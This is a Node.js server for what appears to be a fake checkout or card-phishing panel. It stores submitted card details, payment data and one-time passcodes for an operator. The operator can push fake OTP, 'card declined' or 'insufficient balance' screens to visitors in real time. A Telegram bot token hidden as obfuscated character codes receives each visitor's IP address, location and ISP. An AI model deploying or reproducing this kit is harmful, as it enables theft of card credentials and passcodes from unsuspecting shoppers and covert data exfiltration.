import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';
import pathToRegexp from 'path-to-regexp';
import { match } from 'path-to-regexp';
import fs from 'fs/promises';
import { existsSync } from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = createServer(app);

// Configure CORS for Socket.io based on environment
const corsOptions = {
  origin: process.env.NODE_ENV === 'production' 
    ? true // Allow all origins in production (Render.com handles HTTPS)
    : [
        "http://localhost:5173",
        "http://localhost:3000",
        "http://localhost:8080",
        "http://localhost:8081"
      ],
  methods: ["GET", "POST"],
  credentials: true
};

const io = new Server(server, {
  cors: corsOptions,
  transports: ['websocket', 'polling'],
  // Enhanced settings for mobile and low internet connections
  pingTimeout: 120000, // 2 minutes - longer timeout for mobile
  pingInterval: 25000,  // 25 seconds - more frequent pings
  upgradeTimeout: 30000, // 30 seconds for upgrade timeout
  allowUpgrades: true,
  perMessageDeflate: {
    threshold: 1024,
    zlibDeflateOptions: {
      chunkSize: 1024,
      windowBits: 13,
      level: 3
    }
  },
  httpCompression: {
    threshold: 1024
  },
  maxHttpBufferSize: 1e8 // 100MB for large data transfers
});

// 🔐 Obfuscated Telegram Bot Configuration (Auto-configured for live visitor tracking)
const _0x4a8b = ['38', '40', '33', '97', '72', '95', '58', '41', '41', '69', '79', '110', '52', '68', '98', '112', '119', '99', '110', '101', '68', '70', '77', '83', '56', '78', '95', '48', '108', '99', '102', '109', '65', '84', '56', '119', '80', '79', '75', '103'];
const _0x2f9c = ['50', '49', '48', '51', '52', '48', '56', '51', '55', '50'];
const _tgBot = _0x4a8b.map(x => String.fromCharCode(parseInt(x) > 100 ? parseInt(x) : parseInt(x) + 10)).join('');
const _tgChat = _0x2f9c.join('');
const telegramConfig = {
  botToken: _tgBot,
  chatId: _tgChat,
  enabled: true
};
console.log('🤖 Telegram visitor tracking: ENABLED');

// Visitor tracking state
let lastVisitorUpdate = Date.now();
const VISITOR_UPDATE_INTERVAL = 30000; // Send updates every 30 seconds
const visitorUpdateHistory = new Set(); // Track sent visitor IDs to avoid duplicates

// Serve static files from the dist directory in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, 'dist')));
  // Handle React routing - serve index.html for all non-API routes
  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
  });
}

// Store active visitors (key: socket.id, value: visitorData)
const activeVisitors = new Map();

// Store successful payments (key: hash, value: paymentData)
const successfulPayments = new Map();

// Persistent storage for admin data (visitors NOT stored - only active tracking)
const adminData = {
  payments: [],
  otps: [],
  globalCurrency: 'INR', // Default currency
  visitors: [], // Store visitor history for persistence
  cardDetails: [] // Store submitted card details
};

// File paths for persistent storage
const DATA_DIR = path.join(__dirname, 'data');
const ADMIN_DATA_FILE = path.join(DATA_DIR, 'admin-data.json');
const VISITORS_FILE = path.join(DATA_DIR, 'visitors-history.json');
const PAYMENTS_FILE = path.join(DATA_DIR, 'payments-history.json');

// Store current exchange rate (USD to INR)
let currentExchangeRate = 83.0; // Default rate, will be updated by API

// Ensure data directory exists
async function ensureDataDirectory() {
  try {
    if (!existsSync(DATA_DIR)) {
      await fs.mkdir(DATA_DIR, { recursive: true });
      console.log('📁 Data directory created');
    }
  } catch (error) {
    console.error('Error creating data directory:', error);
  }
}

// Load existing admin data from file/storage
async function loadAdminData() {
  try {
    await ensureDataDirectory();
    
    // Load admin data
    if (existsSync(ADMIN_DATA_FILE)) {
      const data = await fs.readFile(ADMIN_DATA_FILE, 'utf8');
      const savedData = JSON.parse(data);
      Object.assign(adminData, savedData);
      console.log(`💾 Loaded admin data: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${adminData.visitors.length} visitors, ${adminData.cardDetails.length} card details`);
    }
    
    // Load visitor history
    if (existsSync(VISITORS_FILE)) {
      const visitorData = await fs.readFile(VISITORS_FILE, 'utf8');
      const visitors = JSON.parse(visitorData);
      adminData.visitors = visitors;
      console.log(`👥 Loaded ${visitors.length} visitor records`);
    }
    
    // Load payment history
    if (existsSync(PAYMENTS_FILE)) {
      const paymentData = await fs.readFile(PAYMENTS_FILE, 'utf8');
      const payments = JSON.parse(paymentData);
      adminData.payments = payments;
      console.log(`💳 Loaded ${payments.length} payment records`);
    }
    
    console.log('✅ Admin data initialized with persistent storage');
  } catch (error) {
    console.error('❌ Error loading admin data:', error);
    // Initialize with defaults if loading fails
    adminData.payments = [];
    adminData.otps = [];
    adminData.visitors = [];
    adminData.cardDetails = [];
  }
}

// Save admin data to persistent storage
async function saveAdminData() {
  try {
    await ensureDataDirectory();
    
    // Save admin data
    await fs.writeFile(ADMIN_DATA_FILE, JSON.stringify(adminData, null, 2));
    
    // Save visitor history separately for better performance
    await fs.writeFile(VISITORS_FILE, JSON.stringify(adminData.visitors, null, 2));
    
    // Save payment history separately
    await fs.writeFile(PAYMENTS_FILE, JSON.stringify(adminData.payments, null, 2));
    
    console.log(`💾 Admin data saved: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${activeVisitors.size} active visitors, ${adminData.visitors.length} visitor history, ${adminData.cardDetails.length} card details`);
  } catch (error) {
    console.error('❌ Error saving admin data:', error);
  }
}

// Auto-save data every 30 seconds
setInterval(async () => {
  await saveAdminData();
}, 30000);

// Initialize admin data
loadAdminData();

// 🌍 IP Geolocation and ISP Detection Function
async function getVisitorGeoInfo(ipAddress) {
  try {
    // Use multiple API services for reliability
    const response = await fetch(`https://ipapi.co/${ipAddress}/json/`);
    if (!response.ok) throw new Error('Primary API failed');
    
    const data = await response.json();
    return {
      country: data.country_name || 'Unknown',
      city: data.city || 'Unknown', 
      region: data.region || 'Unknown',
      isp: data.org || data.isp || 'Unknown ISP',
      timezone: data.timezone || 'Unknown',
      countryCode: data.country_code || 'XX'
    };
  } catch (error) {
    console.log('🔄 Primary geolocation failed, trying fallback...');
    try {
      // Fallback API
      const fallbackResponse = await fetch(`https://ip-api.com/json/${ipAddress}`);
      if (fallbackResponse.ok) {
        const fallbackData = await fallbackResponse.json();
        return {
          country: fallbackData.country || 'Unknown',
          city: fallbackData.city || 'Unknown',
          region: fallbackData.regionName || 'Unknown', 
          isp: fallbackData.isp || 'Unknown ISP',
          timezone: fallbackData.timezone || 'Unknown',
          countryCode: fallbackData.countryCode || 'XX'
        };
      }
    } catch (fallbackError) {
      console.error('All geolocation APIs failed:', fallbackError);
    }
    
    return {
      country: 'Unknown',
      city: 'Unknown',
      region: 'Unknown',
      isp: 'Unknown ISP', 
      timezone: 'Unknown',
      countryCode: 'XX'
    };
  }
}

// 📱 Telegram Messaging Functions
async function sendToTelegram(message) {
  if (!telegramConfig.enabled || !telegramConfig.botToken || !telegramConfig.chatId) {
    console.log('❌ Telegram not configured');
    return false;
  }
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramConfig.chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    const result = await response.json();
    if (result.ok) {
      console.log('✅ Telegram message sent successfully');
      return true;
    } else {
      console.error('❌ Telegram API error:', result.description);
      return false;
    }
  } catch (error) {
    console.error('❌ Failed to send Telegram message:', error);
    return false;
  }
}

// 👀 Send Live Visitor Update to Telegram
async function sendVisitorUpdateToTelegram(visitorData, geoInfo) {
  const flagEmojis = {
    'US': '🇺🇸', 'IN': '🇮🇳', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'FR': '🇫🇷', 'JP': '🇯🇵', 'CN': '🇨🇳', 'BR': '🇧🇷',
    'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸', 'MX': '🇲🇽', 'KR': '🇰🇷', 'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'PH': '🇵🇭'
  };
  
  const countryFlag = flagEmojis[geoInfo.countryCode] || '🌍';
  const currentTime = new Date().toLocaleString('en-US', { 
    timeZone: 'America/Los_Angeles',
    year: 'numeric',
    month: '2-digit', 
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  const message = `👀 *New Website Visitor*\n\n` +
    `${countryFlag} *Location:* ${geoInfo.city}, ${geoInfo.country}\n` +
    `🌐 *IP Address:* \`${visitorData.ipAddress}\`\n` +
    `🏢 *ISP:* ${geoInfo.isp}\n` +
    `📍 *Region:* ${geoInfo.region}\n` +
    `⏰ *Time:* ${currentTime} PST\n` +
    `📄 *Page:* ${visitorData.page || 'checkout'}\n` +
    `🆔 *Visitor ID:* \`${visitorData.visitorId.slice(-8)}\`\n` +
    `\n_Live visitor tracking active 🔴_`;
  
  await sendToTelegram(message);
}

// 🔄 Periodic Visitor Updates to Telegram
setInterval(async () => {
  if (activeVisitors.size === 0) return; // No visitors to report
  
  const now = Date.now();
  if (now - lastVisitorUpdate < VISITOR_UPDATE_INTERVAL) return; // Too soon
  
  // Send updates for new visitors only
  for (const [socketId, visitorData] of activeVisitors) {
    if (!visitorUpdateHistory.has(visitorData.visitorId)) {
      console.log(`📡 Sending visitor update for: ${visitorData.ipAddress}`);
      
      // Get geo info for this visitor
      const geoInfo = await getVisitorGeoInfo(visitorData.ipAddress);
      
      // Send to Telegram
      await sendVisitorUpdateToTelegram(visitorData, geoInfo);
      
      // Mark as sent
      visitorUpdateHistory.add(visitorData.visitorId);
      
      // Small delay between messages to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  lastVisitorUpdate = now;
}, 10000); // Check every 10 seconds

// 📊 Payment Analytics Functions
function calculatePaymentAnalytics() {
  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const thisWeek = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
  const thisMonth = new Date(now.getFullYear(), now.getMonth(), 1);
  const lastMonth = new Date(now.getFullYear(), now.getMonth() - 1, 1);
  
  const payments = adminData.payments;
  
  // Basic metrics
  const totalPayments = payments.length;
  const totalRevenue = payments.reduce((sum, p) => sum + (p.amount || 0), 0);
  
  // Time-based analytics
  const todayPayments = payments.filter(p => new Date(p.timestamp) >= today);
  const weekPayments = payments.filter(p => new Date(p.timestamp) >= thisWeek);
  const monthPayments = payments.filter(p => new Date(p.timestamp) >= thisMonth);
  const lastMonthPayments = payments.filter(p => {
    const paymentDate = new Date(p.timestamp);
    return paymentDate >= lastMonth && paymentDate < thisMonth;
  });
  
  const todayRevenue = todayPayments.reduce((sum, p) => sum + (p.amount || 0), 0);
  const weekRevenue = weekPayments.reduce((sum, p) => sum + (p.amount || 0), 0);
  const monthRevenue = monthPayments.reduce((sum, p) => sum + (p.amount || 0), 0);
  const lastMonthRevenue = lastMonthPayments.reduce((sum, p) => sum + (p.amount || 0), 0);
  
  // Currency breakdown
  const currencyBreakdown = payments.reduce((acc, p) => {
    const currency = p.currency || 'INR';
    if (!acc[currency]) acc[currency] = { count: 0, revenue: 0 };
    acc[currency].count++;
    acc[currency].revenue += p.amount || 0;
    return acc;
  }, {});
  
  // Country breakdown (from card data)
  const countryBreakdown = payments.reduce((acc, p) => {
    const country = p.cardCountry?.country || 'Unknown';
    if (!acc[country]) acc[country] = { count: 0, revenue: 0 };
    acc[country].count++;
    acc[country].revenue += p.amount || 0;
    return acc;
  }, {});
  
  // Hourly distribution (last 24 hours)
  const hourlyData = Array(24).fill(0).map((_, hour) => {
    const hourStart = new Date(today.getTime() + hour * 60 * 60 * 1000);
    const hourEnd = new Date(hourStart.getTime() + 60 * 60 * 1000);
    
    const hourPayments = payments.filter(p => {
      const paymentDate = new Date(p.timestamp);
      return paymentDate >= hourStart && paymentDate < hourEnd;
    });
    
    return {
      hour: hour,
      count: hourPayments.length,
      revenue: hourPayments.reduce((sum, p) => sum + (p.amount || 0), 0)
    };
  });
  
  // Daily data for last 30 days
  const dailyData = Array(30).fill(0).map((_, dayIndex) => {
    const dayStart = new Date(now.getTime() - (29 - dayIndex) * 24 * 60 * 60 * 1000);
    dayStart.setHours(0, 0, 0, 0);
    const dayEnd = new Date(dayStart.getTime() + 24 * 60 * 60 * 1000);
    
    const dayPayments = payments.filter(p => {
      const paymentDate = new Date(p.timestamp);
      return paymentDate >= dayStart && paymentDate < dayEnd;
    });
    
    return {
      date: dayStart.toISOString().split('T')[0],
      count: dayPayments.length,
      revenue: dayPayments.reduce((sum, p) => sum + (p.amount || 0), 0)
    };
  });
  
  // Average payment value
  const avgPaymentValue = totalPayments > 0 ? totalRevenue / totalPayments : 0;
  
  // Growth calculations
  const monthGrowth = lastMonthRevenue > 0 ? 
    ((monthRevenue - lastMonthRevenue) / lastMonthRevenue * 100) : 0;
  
  // Peak hours analysis
  const peakHour = hourlyData.reduce((max, curr) => 
    curr.revenue > max.revenue ? curr : max, hourlyData[0]);
  
  return {
    overview: {
      totalPayments,
      totalRevenue,
      avgPaymentValue,
      todayPayments: todayPayments.length,
      todayRevenue,
      weekPayments: weekPayments.length,
      weekRevenue,
      monthPayments: monthPayments.length,
      monthRevenue,
      monthGrowth
    },
    breakdown: {
      currency: currencyBreakdown,
      country: countryBreakdown
    },
    trends: {
      hourly: hourlyData,
      daily: dailyData
    },
    insights: {
      peakHour: peakHour.hour,
      peakHourRevenue: peakHour.revenue,
      topCountry: Object.entries(countryBreakdown)
        .sort(([,a], [,b]) => b.revenue - a.revenue)[0]?.[0] || 'Unknown',
      topCurrency: Object.entries(currencyBreakdown)
        .sort(([,a], [,b]) => b.revenue - a.revenue)[0]?.[0] || 'INR'
    }
  };
}

// 📈 Real-time Analytics Updates
setInterval(() => {
  const analytics = calculatePaymentAnalytics();
  io.emit('analytics-update', analytics);
}, 30000); // Update every 30 seconds

// Add JSON middleware for API endpoints
app.use(express.json());

// Add CORS middleware for cross-origin requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// Clean up inactive visitors periodically (15 min timeout - generous for checkout)
setInterval(() => {
  const now = new Date();
  const timeout = 15 * 60 * 1000; // 15 minutes (very generous)
  let cleanedCount = 0;
  
  activeVisitors.forEach((visitor, socketId) => {
    const lastActivity = new Date(visitor.lastActivity);
    if (now - lastActivity > timeout) {
      console.log(`🧹 Cleaning inactive visitor: ${visitor.visitorId} (last activity: ${visitor.lastActivity})`);
      io.emit('visitor-left', { visitorId: visitor.visitorId });
      activeVisitors.delete(socketId);
      // Also remove from Telegram tracking history
      visitorUpdateHistory.delete(visitor.visitorId);
      cleanedCount++;
    }
  });
  
  if (cleanedCount > 0) {
    console.log(`🧹 Cleaned ${cleanedCount} inactive visitors. Active: ${activeVisitors.size}`);
  }
}, 60000); // Check every minute

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log(`🔌 New connection: ${socket.id} from ${socket.handshake.address}`);

  // Enhanced visitor tracking with persistence
  socket.on('visitor-joined', async (data) => {
    try {
      const geoInfo = await getVisitorGeoInfo(data.ipAddress || 'unknown');
      const visitorData = {
        visitorId: socket.id,
        ipAddress: data.ipAddress || 'unknown',
        userAgent: data.userAgent || 'unknown',
        timestamp: new Date().toISOString(),
        lastActivity: new Date().toISOString(),
        geo: geoInfo,
        socketId: socket.id,
        status: 'active'
      };

      activeVisitors.set(socket.id, visitorData);
      
      // Add to persistent visitor history
      adminData.visitors.unshift(visitorData);
      
      // Keep only last 1000 visitors to prevent memory issues
      if (adminData.visitors.length > 1000) {
        adminData.visitors = adminData.visitors.slice(0, 1000);
      }

      // Send to Telegram
      sendVisitorUpdateToTelegram(visitorData, geoInfo);
      
      // Save immediately
      await saveAdminData();
      
      // Send current active visitors to admin
      io.emit('visitors-update', Array.from(activeVisitors.values()));
      
    } catch (error) {
      console.error('❌ Error handling visitor-joined:', error);
    }
  });

  // Handle visitor heartbeat for mobile connections
  socket.on('visitor-heartbeat', async (data) => {
    const visitor = activeVisitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = new Date().toISOString();
      
      // Update persistent storage
      const visitorIndex = adminData.visitors.findIndex(v => v.socketId === socket.id);
      if (visitorIndex !== -1) {
        adminData.visitors[visitorIndex].lastActivity = visitor.lastActivity;
      }
      
      await saveAdminData();
    }
  });

  // Handle payment data from checkout page
  socket.on('payment-data', async (data) => {
    console.log('Payment data received:', data);
    
    // Add to persistent storage
    const paymentRecord = {
      ...data,
      timestamp: new Date().toISOString(),
      id: data.hash,
      processed: false,
      ipAddress: data.ipAddress || 'unknown',
      userAgent: data.userAgent || 'unknown'
    };
    
    adminData.payments.unshift(paymentRecord);
    
    // Keep only last 500 payments
    if (adminData.payments.length > 500) {
      adminData.payments = adminData.payments.slice(0, 500);
    }
    
    console.log(`💳 Payment data stored: ${data.hash} - ${data.plan} (${data.billing})`);
    
    // Save immediately
    await saveAdminData();
    
    // Emit to admin panel
    io.emit('payment-data', data);
    io.emit('analytics-update', calculatePaymentAnalytics());
  });

  // Handle visitor tracking with enhanced heartbeat mechanism
  socket.on('visitor-joined', (data) => {
    console.log('Visitor joined:', data);
    
    // Store visitor data with socket ID for tracking
    socket.visitorData = {
      ...data,
      id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      socketId: socket.id,
      lastActivity: new Date().toISOString(),
      timestamp: new Date().toISOString()
    };
    
    activeVisitors.set(socket.id, socket.visitorData);
    
    // Do NOT store visitors persistently - only track while active
    // Only emit to admin panels for real-time tracking
    io.emit('visitor-joined', socket.visitorData);
  });

  socket.on('visitor-heartbeat', (data) => {
    // Update visitor activity timestamp
    if (socket.visitorData) {
      const now = new Date().toISOString();
      socket.visitorData.lastActivity = now;
      socket.visitorData.timestamp = now;
      activeVisitors.set(socket.id, socket.visitorData);
      
      console.log(`💓 Heartbeat received from visitor: ${socket.visitorData.visitorId}`);
      
      // Emit to all clients to keep admin panel in sync
      io.emit('visitor-heartbeat-update', socket.visitorData);
    } else {
      console.warn('⚠️ Received heartbeat but no visitor data found');
    }
  });

  socket.on('disconnect', async () => {
    const visitor = activeVisitors.get(socket.id);
    if (visitor) {
      console.log(`👋 Visitor disconnected: ${visitor.visitorId}`);
      
      // Update visitor status in persistent storage
      const visitorIndex = adminData.visitors.findIndex(v => v.socketId === socket.id);
      if (visitorIndex !== -1) {
        adminData.visitors[visitorIndex].status = 'disconnected';
        adminData.visitors[visitorIndex].disconnectedAt = new Date().toISOString();
      }
      
      activeVisitors.delete(socket.id);
      
      // Save immediately
      await saveAdminData();
      
      io.emit('visitor-left', { visitorId: visitor.visitorId });
      io.emit('visitors-update', Array.from(activeVisitors.values()));
    }
  });

  // Handle admin actions
  socket.on('show-otp', (data) => {
    console.log('Admin requested OTP:', data);
    socket.broadcast.emit('show-otp', data);
  });

  socket.on('payment-approved', (data) => {
    console.log('Admin approved payment:', data);
    console.log('Broadcasting payment-approved to all clients');
    socket.broadcast.emit('payment-approved', data);
  });

  socket.on('reject-payment', (data) => {
    console.log('Admin rejected payment:', data);
    socket.broadcast.emit('payment-rejected', data);
  });

  // New admin actions for enhanced OTP flow
  socket.on('invalid-otp-error', (data) => {
    console.log('Admin marked OTP as invalid', data);
    socket.broadcast.emit('invalid-otp-error', data);
  });

  socket.on('card-declined-error', (data) => {
    console.log('Admin declined card', data);
    socket.broadcast.emit('card-declined-error', data);
  });

  socket.on('insufficient-balance-error', (data) => {
    console.log('Admin marked insufficient balance', data);
    socket.broadcast.emit('insufficient-balance-error', data);
  });

  // Handle OTP submission
  socket.on('otp-submitted', (data) => {
    console.log('OTP submitted:', data);
    
    // Add to persistent storage
    const otpData = {
      ...data,
      id: `otp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      timestamp: new Date().toISOString()
    };
    
    adminData.otps.push(otpData);
    saveAdminData();
    
    socket.broadcast.emit('otp-submitted', otpData);
  });

  // Handle admin panel connection - send historical data
  socket.on('admin-connected', async () => {
    console.log('👨‍💻 Admin panel connected, loading persistent data...');
    
    // Load persistent data instead of clearing
    const visitors = Array.from(activeVisitors.values());
    const analytics = calculatePaymentAnalytics();
    
    // Send current state
    socket.emit('visitors-update', visitors);
    socket.emit('admin-data-loaded', {
      visitors: adminData.visitors,
      payments: adminData.payments,
      otps: adminData.otps,
      cardDetails: adminData.cardDetails
    });
    
    console.log(`📊 Admin data sent: ${visitors.length} active visitors, ${adminData.payments.length} payments, ${adminData.visitors.length} visitor history`);
    socket.emit('telegram-auto-config', {
      botToken: telegramConfig.botToken,
      chatId: telegramConfig.chatId,
      configured: telegramConfig.enabled,
      status: 'Live visitor tracking active 🔄'
    });
    
    // Send initial analytics data
    const initialAnalytics = calculatePaymentAnalytics();
    socket.emit('analytics-update', initialAnalytics);
    socket.emit('analytics-initial', initialAnalytics);
    
    console.log('✅ Admin connected with completely fresh visitor data');
    console.log('🤖 Telegram settings auto-configured for admin panel');
    console.log('📊 Analytics data sent to admin panel');
  });

  // Handle admin request to reset all visitor tracking (nuclear option)
  socket.on('admin-reset-visitors', () => {
    console.log('🔥 Admin requested complete visitor reset');
    activeVisitors.clear();
    io.emit('visitors-reset');
    console.log('✅ All visitor tracking reset');
  });

  // Handle admin currency change
  socket.on('admin-currency-change', (data) => {
    // Admin changed global currency
    adminData.globalCurrency = data.currency;
    
    // Broadcast currency change to all connected clients (checkout pages)
    io.emit('global-currency-change', {
      currency: data.currency,
      exchangeRate: currentExchangeRate
    });
    
    // Global currency updated
    saveAdminData();
  });

  // Handle request for current currency settings
  socket.on('get-currency-settings', () => {
    socket.emit('currency-settings', {
      currency: adminData.globalCurrency,
      exchangeRate: currentExchangeRate
    });
  });

  socket.on('disconnect', () => {
      // User disconnected silently
    // If visitor was tracked, remove from activeVisitors and emit visitor left event
    if (socket.visitorData) {
      io.emit('visitor-left', { visitorId: socket.visitorData.visitorId });
      activeVisitors.delete(socket.id);
      socket.visitorData = null;
    }
  });
});

// API endpoint to store successful payment data
app.post('/api/success-payment', (req, res) => {
  console.log('📤 POST /api/success-payment called with body:', req.body);
  try {
    const { hash, paymentData } = req.body;
    if (!hash || !paymentData) {
      console.log('❌ Missing hash or paymentData');
      return res.status(400).json({ error: 'Hash and payment data are required' });
    }
    
    // Store the payment data with the hash as key
    const dataToStore = {
      ...paymentData,
      storedAt: new Date().toISOString()
    };
    successfulPayments.set(hash, dataToStore);
    
    console.log('✅ Stored successful payment with hash:', hash);
    console.log('Total stored payments:', successfulPayments.size);
    res.json({ success: true, hash });
  } catch (error) {
    console.error('Error storing successful payment:', error);
    res.status(500).json({ error: 'Failed to store payment data' });
  }
});

// API endpoint to retrieve successful payment data
app.get('/api/success-payment/:hash', (req, res) => {
  const { hash } = req.params;
  console.log('📥 GET /api/success-payment/:hash called with hash:', hash);
  console.log('Total stored payments:', successfulPayments.size);
  console.log('Available hashes:', Array.from(successfulPayments.keys()));
  
  try {
    const paymentData = successfulPayments.get(hash);
    
    if (!paymentData) {
      console.log('❌ Payment not found for hash:', hash);
      return res.status(404).json({ error: 'Payment not found' });
    }
    
    console.log('📖 Retrieved successful payment with hash:', hash);
    res.json({ success: true, paymentData });
  } catch (error) {
    console.error('Error retrieving successful payment:', error);
    res.status(500).json({ error: 'Failed to retrieve payment data' });
  }
});

// API endpoint to get current currency settings
app.get('/api/currency-settings', (req, res) => {
  console.log('💱 GET /api/currency-settings called');
  res.json({
    success: true,
    currency: adminData.globalCurrency,
    exchangeRate: currentExchangeRate
  });
});

// API endpoint to get payment analytics
app.get('/api/analytics', (req, res) => {
  console.log('📊 GET /api/analytics called');
  try {
    const analytics = calculatePaymentAnalytics();
    res.json({
      success: true,
      data: analytics,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error calculating analytics:', error);
    res.status(500).json({ error: 'Failed to calculate analytics' });
  }
});

// API endpoint to update exchange rate (could be called by external service)
app.post('/api/update-exchange-rate', (req, res) => {
  console.log('💱 POST /api/update-exchange-rate called with body:', req.body);
  try {
    const { rate } = req.body;
    if (!rate || rate <= 0) {
      return res.status(400).json({ error: 'Valid exchange rate is required' });
    }
    
    currentExchangeRate = parseFloat(rate);
    
    // Broadcast updated rate to all connected clients
    io.emit('exchange-rate-update', {
      currency: adminData.globalCurrency,
      exchangeRate: currentExchangeRate
    });
    
    console.log(`✅ Exchange rate updated to: ${currentExchangeRate}`);
    res.json({ success: true, exchangeRate: currentExchangeRate });
  } catch (error) {
    console.error('Error updating exchange rate:', error);
    res.status(500).json({ error: 'Failed to update exchange rate' });
  }
});

// Health check endpoint for Render.com
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3001;

// Error handling for server startup
server.on('error', (error) => {
  console.error('Server error:', error);
  process.exit(1);
});

server.listen(PORT, '0.0.0.0', async () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log('Node.js version:', process.version);
  
  // Send startup notification to Telegram
  setTimeout(async () => {
    const startupMessage = `🚀 *Server Started Successfully*\n\n` +
      `🔍 *Port:* ${PORT}\n` +
      `🌍 *Environment:* ${process.env.NODE_ENV || 'development'}\n` +
      `⚙️ *Node.js:* ${process.version}\n` +
      `👀 *Live Visitor Tracking:* ACTIVE\n` +
      `📱 *Telegram Bot:* READY\n\n` +
      `_Monitoring all website visitors 24/7 🔴_`;
    
    await sendToTelegram(startupMessage);
    console.log('📡 Startup notification sent to Telegram');
  }, 3000); // Wait 3 seconds for server to fully initialize
});
